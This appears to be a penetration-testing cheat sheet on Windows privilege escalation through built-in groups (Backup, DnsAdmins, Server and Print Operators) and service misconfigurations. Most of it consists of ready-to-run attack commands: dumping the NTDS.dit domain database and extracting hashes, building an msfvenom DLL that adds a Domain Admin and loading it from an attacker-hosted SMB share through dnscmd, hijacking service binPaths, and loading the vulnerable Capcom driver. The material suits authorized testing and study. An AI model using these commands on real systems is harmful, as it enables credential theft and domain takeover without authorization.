# Abusing Built-in Groups
**Concept:** Windows has several built-in groups that grant specific high-value privileges. If you compromise a user in one of these groups, you can often escalate to SYSTEM or Domain Admin.
## 1. Backup Operators
**Privilege:** `SeBackupPrivilege` and `SeRestorePrivilege`. Allows reading any file (to backup) and writing any file (to restore), bypassing ACLs.
### Exploitation: Dumping NTDS.dit (Domain Controller)
If on a DC, you can dump the Active Directory database.
1. **Enable Privilege:** Use a script or tool to enable `SeBackupPrivilege` (it is disabled by default). 
```powershell
# Import DLLs from https://github.com/giuliano108/SeBackupPrivilege
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
```
2. **Create Shadow Copy:** The `NTDS.dit` file is locked. Use `diskshadow` to create a snapshot.
```powershell
# Create a script file (diskshadow.txt)
set context persistent nowriters
add volume c: alias cdrive
create
expose %cdrive% E:
```

```powershell
diskshadow /s diskshadow.txt
```    
3. **Exfiltrate:** Copy the database and SYSTEM hive from the snapshot.
```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
reg save HKLM\SYSTEM C:\Temp\system.hive
```
4. **Extract Hashes:** Use `secretsdump.py` offline.
```shell
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```
### Exploitation: File Copy (Member Server)
Copy sensitive files like `SAM`, `SYSTEM`, or specific flags.
```powershell
Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\flag.txt .\flag.txt
```
## 2. DnsAdmins
**Privilege:** Can manage the DNS service. **Exploitation:** The DNS service runs as `SYSTEM`. We can force it to load an arbitrary DLL.
1. **Generate Malicious DLL:**
```shell
msfvenom -p windows/x64/exec cmd='net group "Domain Admins" <User> /add /domain' -f dll -o adduser.dll
```
2. **Host DLL:** Serve it via SMB (Impacket `smbserver.py`) or WebDAV.
```shell
sudo python3 smbserver.py SHARE .
```
3. **Inject DLL:** Configure the DNS server to load your DLL as a plugin.
```powershell
dnscmd <DC_IP> /config /serverlevelplugindll \\<ATTACKER_IP>\SHARE\adduser.dll
```
4. **Trigger:** Restart DNS (requires privileges) or crash it/wait for a reboot.
```powershell
sc \\<DC_IP> stop dns
sc \\<DC_IP> start dns
```
## 3. Server Operators

**Privilege:** Can manage system services (start/stop/config) and backup files. **Exploitation:** Modify a service binary path to execute a command as SYSTEM.
1. **Query Service:** Check permissions on a service (e.g., `AppReadiness`).
```powershell
sc qc AppReadiness
# Look for "SERVICE_START_NAME : LocalSystem"
```
2. **Modify Binary Path:** Point it to a malicious command.
```powershell
sc config AppReadiness binPath= "cmd /c net localgroup Administrators <User> /add"
```
3. **Start Service:**
	```powershell
	sc start AppReadiness
	```
    - _Note:_ The service will likely fail to start (error 1053), but the command executes.
## 4. Print Operators
**Privilege:** Can load device drivers (`SeLoadDriverPrivilege`) on Domain Controllers. **Exploitation:** Load a vulnerable driver (e.g., Capcom.sys) to exploit the kernel and gain SYSTEM.
1. **Enable Privilege:** Use a tool like `EnableSeLoadDriverPrivilege.exe`.
2. **Load Vulnerable Driver:**
    ```powershell
    # Prepare registry for the driver
    reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Temp\Capcom.sys"
    reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
    
    # Trigger load (using EoPLoadDriver or similar)
    EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Temp\Capcom.sys
    ```
1. **Exploit Kernel:** Run the exploit binary (`ExploitCapcom.exe`) to elevate to SYSTEM.
# Service Abuse Techniques (General)
**Concept:** If you can modify a service's configuration or its executable file, you can execute code with the service's privileges (usually SYSTEM).
## 1. Unquoted Service Paths
**Vulnerability:** A service path contains spaces and is not enclosed in quotes (e.g., `C:\Program Files\My Service\service.exe`). Windows attempts to execute `C:\Program.exe`, then `C:\Program Files\My.exe`, etc. 
**Exploitation:** Place a malicious binary at `C:\Program.exe` or `C:\Program Files\My.exe`.
```powershell
# Find vulnerable services
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
```
## 2. Weak Service Permissions
**Vulnerability:** Your user can modify the service configuration (`SERVICE_CHANGE_CONFIG`). 
**Exploitation:** Same as Server Operators. Change `binPath` to a reverse shell or net user add command.
```powershell
# Check permissions (AccessChk)
accesschk.exe /accepteula -uwcqv <User> *
```